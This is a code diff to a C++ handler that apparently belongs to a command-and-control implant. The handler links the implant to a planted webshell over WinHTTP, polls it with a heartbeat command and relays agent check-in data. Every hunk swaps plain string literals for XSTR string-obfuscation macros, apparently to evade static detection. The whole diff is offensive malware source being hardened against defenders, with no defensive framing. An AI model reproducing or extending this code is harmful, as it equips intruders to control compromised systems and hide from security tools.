@@ -24,7 +24,7 @@ auto declfn starburst::cmd_link_webshell(
     auto url = parser_string( params, &url_len );
     if ( !url || url_len == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "missing url" ) ) );
+            XSTR( "missing url" ) );
         return;
     }
 
@@ -43,7 +43,7 @@ auto declfn starburst::cmd_link_webshell(
     auto param_name = parser_string( params, &param_name_len );
 
     if ( !param_name || param_name_len == 0 ) {
-        param_name = symbol<char*>( const_cast<char*>( "data" ) );
+        param_name = XSTR( "data" );
         param_name_len = 4;
     }
 
@@ -53,7 +53,7 @@ auto declfn starburst::cmd_link_webshell(
             inst.heap_alloc( sizeof( WebshellLinkState ) ) );
         if ( !state ) {
             queue_response( inst, task_uuid, RESPONSE_ERROR,
-                symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
+                XSTR( "alloc failed" ) );
             return;
         }
         memory::zero( state, sizeof( WebshellLinkState ) );
@@ -63,7 +63,7 @@ auto declfn starburst::cmd_link_webshell(
     auto state = static_cast<WebshellLinkState*>( inst.webshell_link_state );
     if ( !ws_resolve_winhttp( inst, state ) ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "failed to load winhttp" ) ) );
+            XSTR( "failed to load winhttp" ) );
         return;
     }
 
@@ -72,7 +72,7 @@ auto declfn starburst::cmd_link_webshell(
         inst.heap_alloc( sizeof( instance::WebshellLink ) ) );
     if ( !link ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
+            XSTR( "alloc failed" ) );
         return;
     }
 
@@ -122,7 +122,7 @@ auto declfn starburst::cmd_link_webshell(
     }
 
     // test connectivity by polling the webshell
-    char poll_cmd[] = { 'p','o','l','l','_','p','2','p','|','h','e','a','r','t','b','e','a','t', 0 };
+    xstr(poll_cmd, "poll_p2p|heartbeat");
 
     uint8_t* resp     = nullptr;
     uint32_t resp_len = 0;
@@ -139,7 +139,7 @@ auto declfn starburst::cmd_link_webshell(
         inst.heap_free( link );
 
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "webshell unreachable" ) ) );
+            XSTR( "webshell unreachable" ) );
         return;
     }
 
@@ -212,7 +212,7 @@ auto declfn starburst::cmd_link_webshell(
     if ( !pkg ) {
         if ( resp ) inst.heap_free( resp );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
+            XSTR( "alloc failed" ) );
         return;
     }
 
@@ -220,7 +220,7 @@ auto declfn starburst::cmd_link_webshell(
     package_add_byte( inst, pkg, C2_PROFILE_WEBSHELL );
     package_add_int32( inst, pkg, link->link_id );
     package_add_string( inst, pkg, link->agent_id ? link->agent_id :
-        symbol<char*>( const_cast<char*>( "" ) ) );
+        XSTR( "" ) );
 
     // include P2P checkin data if present
     if ( p2p_data && p2p_len > 0 ) {
@@ -263,16 +263,16 @@ auto declfn starburst::cmd_link_webshell(
     uint32_t msg_sz = 17 + url_sz + 9 + aid_sz + 1; // "Linked webshell: " + url + "\nAgent: " + id
     auto resp_buf = static_cast<char*>( inst.heap_alloc( msg_sz ) );
     if ( resp_buf ) {
-        str_copy( resp_buf, symbol<char*>( const_cast<char*>( "Linked webshell: " ) ) );
+        str_copy( resp_buf, XSTR( "Linked webshell: " ) );
         if ( link->url ) str_concat( resp_buf, link->url );
-        str_concat( resp_buf, symbol<char*>( const_cast<char*>( "\nAgent: " ) ) );
+        str_concat( resp_buf, XSTR( "\nAgent: " ) );
         str_concat( resp_buf, link->agent_id ? link->agent_id :
-            symbol<char*>( const_cast<char*>( "pending" ) ) );
+            XSTR( "pending" ) );
         queue_response( inst, task_uuid, RESPONSE_SUCCESS, resp_buf );
         inst.heap_free( resp_buf );
     } else {
         queue_response( inst, task_uuid, RESPONSE_SUCCESS,
-            symbol<char*>( const_cast<char*>( "Linked webshell" ) ) );
+            XSTR( "Linked webshell" ) );
     }
 }
 
